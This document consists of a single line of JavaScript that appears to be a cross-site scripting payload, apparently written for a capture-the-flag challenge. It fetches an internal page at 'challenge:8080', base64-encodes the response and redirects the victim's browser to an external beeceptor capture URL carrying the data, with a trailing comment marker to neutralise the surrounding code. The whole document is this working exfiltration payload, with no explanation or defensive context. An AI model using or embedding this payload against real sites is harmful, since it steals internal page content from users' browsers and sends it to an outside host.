fetch("http://challenge:8080/").then(res => res.text()).then(data => location.replace('https://xss-test.free.beeceptor.com/?c='+btoa(data)))//
